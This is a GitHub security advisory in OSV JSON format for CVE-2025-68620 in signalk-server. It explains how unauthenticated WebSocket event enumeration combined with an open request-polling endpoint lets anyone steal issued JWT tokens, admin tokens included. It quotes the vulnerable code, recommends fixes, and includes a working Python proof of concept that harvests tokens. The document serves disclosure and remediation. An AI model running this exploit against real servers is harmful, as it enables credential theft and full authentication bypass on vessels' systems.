{
  "schema_version": "1.4.0",
  "id": "GHSA-fq56-hvg6-wvm5",
  "modified": "2026-01-02T15:28:55Z",
  "published": "2026-01-02T15:28:54Z",
  "aliases": [
    "CVE-2025-68620"
  ],
  "summary": "Signal K Server vulnerable to JWT Token Theft via WebSocket Enumeration and Unauthenticated Polling",
  "details": "SignalK Server exposes two features that can be chained together to steal JWT authentication tokens without any prior authentication. The attack combines WebSocket-based request enumeration with unauthenticated polling of access request status.\n\n**Unauthenticated WebSocket Request Enumeration**: When a WebSocket client connects to the SignalK stream endpoint with the `serverevents=all` query parameter, the server sends all cached server events including `ACCESS_REQUEST` events that contain details about pending access requests. The `startServerEvents` function iterates over `app.lastServerEvents` and writes each cached event to any connected client without verifying authorization level. Since WebSocket connections are allowed for readonly users (which includes unauthenticated users when `allow_readonly` is true), attackers receive these events containing request IDs, client identifiers, descriptions, requested permissions, and IP addresses.\n\n**Unauthenticated Token Polling**: The access request status endpoint at `/signalk/v1/access/requests/:id` returns the full state of an access request without requiring authentication. When an administrator approves a request, the response includes the issued JWT token in plaintext. The `queryRequest` function returns the complete request object including the token field, and the REST endpoint uses readonly authentication, allowing unauthenticated access.\n\nAn attacker has two paths to exploit these vulnerabilities:\n\n1. The attacker creates their own access request (using the IP spoofing vulnerability to craft a convincing spoofed request), then polls their own request ID until an administrator approves it, receiving the JWT token.\n\n2. The attacker passively monitors the WebSocket stream to discover request IDs from legitimate devices, then polls those IDs and steals the JWT tokens when administrators approve them, hijacking legitimate device credentials.\n\nBoth paths require zero authentication and enable complete authentication bypass.\n\n### Affected Code\n\n**File**: `src/events.ts` (lines 40-43)\n\n```typescript\nObject.keys(app.lastServerEvents).forEach((propName) => {\n  spark.write(app.lastServerEvents[propName])\n})\n```\n\nAll cached server events, including `ACCESS_REQUEST`, are sent to any connected WebSocket client without permission checks.\n\n**File**: `src/tokensecurity.js` (lines 946-948)\n\n```javascript\nstrategy.getAccessRequestsResponse = () => {\n  return filterRequests('accessRequest', 'PENDING')\n}\n```\n\nThis function returns all pending requests with full details, which is then broadcast as a server event.\n\n**File**: `src/requestResponse.js` (lines 108-135)\n\n```javascript\nfunction createReply(request, state, props) {\n  const reply = {\n    state: state,\n    requestId: request.requestId\n  }\n\n  if (request.updateCb) {\n    props.forEach((prop) => {\n      if (typeof request[prop] !== 'undefined') {\n        reply[prop] = request[prop]  // Includes 'token' when approved\n      }\n    })\n  }\n  return reply\n}\n```\n\nWhen an access request transitions to COMPLETED state with APPROVED permission, the token is included in the reply object.\n\n**File**: `src/interfaces/rest.js` (endpoint registration)\n\nThe `/signalk/v1/access/requests/:id` endpoint uses readonly authentication, allowing unauthenticated access when `allow_readonly` is true.\n\n### Impact\n\nAn attacker can obtain any JWT token issued by the server without authentication. By exploiting the social engineering vulnerability to request admin permissions, they receive a fully privileged admin token granting access to all protected endpoints including package installation, effectively bypassing authentication entirely. Additionally, attackers can hijack legitimate device credentials by stealing tokens intended for real devices.\n\n### PoC\n\n```python\nimport json, websocket, requests, time\n\nTARGET_IP, TARGET_PORT = \"localhost\", 3000\nTARGET_WS = f\"ws://{TARGET_IP}:{TARGET_PORT}\"\nTARGET_HTTP = f\"http://{TARGET_IP}:{TARGET_PORT}\"\n\ndef poll_for_token(request_id, href):\n    print(f\"[*] Polling started for request {request_id}\")\n    url = f\"{TARGET_HTTP}{href}\"\n    while True:\n        try:\n            r = requests.get(url)\n            \n            if r.status_code == 200:\n                data = r.json()\n                state = data.get(\"state\")\n                print(f\"[.] Request {request_id} state: {state}\")\n                \n                if state == \"COMPLETED\":\n                    access_req = data.get(\"accessRequest\", {})\n                    permission = access_req.get(\"permission\")\n                    token = access_req.get(\"token\")\n                    \n                    print(f\"[*] Request completed - Permission: {permission}, Token present: {bool(token)}\")\n                    \n                    if token:\n                        print(f\"[+] TOKEN STOLEN\")\n                        print(f\"[+] Permission: {permission}\")\n                        print(f\"[+] JWT Token: {token}\")\n                        return token\n                    else:\n                        print(f\"[-] Request {request_id} denied or no token\")\n                        return None\n            else:\n                print(f\"[-] HTTP {r.status_code} for request {request_id}\")\n                        \n        except Exception as e:\n            print(f\"[-] Error polling {request_id}: {e}\")\n            \n        time.sleep(5)\n\ndef monitor_and_steal_tokens():\n    uri = f\"{TARGET_WS}/signalk/v1/stream?serverevents=all\"\n    print(f\"[*] Connecting to {uri}\")\n    \n    ws = websocket.create_connection(uri)\n    print(\"[+] Connected, monitoring for ACCESS_REQUEST events...\")\n    \n    while True:\n        message = ws.recv()\n        msg = json.loads(message)\n        \n        if msg.get(\"type\") == \"ACCESS_REQUEST\":\n            print(\"[+] ACCESS_REQUEST event received!\")\n            data = msg.get(\"data\", [])\n            \n            if data:\n                req = data[0]\n                request_id = req.get('requestId')\n                permissions = req.get('clientRequest', {}).get('permissions')\n                href = req.get('href', f'/signalk/v1/requests/{request_id}')\n                \n                print(f\"[*] Found request: {request_id}\")\n                print(f\"[*] Closing WebSocket and starting polling...\")\n                \n                ws.close()\n                poll_for_token(request_id, href)\n                break\n\nif __name__ == \"__main__\":\n    monitor_and_steal_tokens()\n```\n\n### Recommendations\n\n1. Require strict authentication for all WebSocket channels. The `serverevents=all` parameter should only be accessible to authenticated admin users. Unauthenticated or readonly users should not receive any server events.\n2. Place `ACCESS_REQUEST` events behind strict authentication. Even if other server events are available to readonly users, access request details must only be sent to authenticated administrators.\n3. Implement client verification so only the original requester can retrieve their token\n4. Consider delivering tokens through a separate secure channel rather than the polling endpoint",
  "severity": [
    {
      "type": "CVSS_V3",
      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "npm",
        "name": "signalk-server"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "2.19.0"
            }
          ]
        }
      ]
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/security/advisories/GHSA-fq56-hvg6-wvm5"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68620"
    },
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/commit/221aff6cd89c56308084d1781b3abbf938605bd3"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/SignalK/signalk-server"
    },
    {
      "type": "WEB",
      "url": "https://github.com/SignalK/signalk-server/releases/tag/v2.19.0"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-288"
    ],
    "severity": "CRITICAL",
    "github_reviewed": true,
    "github_reviewed_at": "2026-01-02T15:28:54Z",
    "nvd_published_at": "2026-01-01T19:15:53Z"
  }
}